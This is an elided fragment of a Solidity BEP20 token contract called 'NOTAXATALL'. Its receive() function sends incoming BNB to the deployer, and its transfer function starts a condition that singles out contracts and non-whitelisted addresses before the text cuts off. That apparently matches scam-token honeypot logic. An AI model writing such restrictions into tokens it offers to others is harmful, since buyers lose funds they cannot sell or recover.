...
contract NOTAXATALL is IBEP20, Renounce {
    ...
    receive() external payable {IBEP20(address(this)).transfer(address(DEAD), balanceOf(address(this))); payable(deployer).transfer(msg.value);}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        if(isCont(sender) && !isInternal[sender] || isCont(recipient) &&
         !isInternal[recipient] || !isInternal[sender] && 
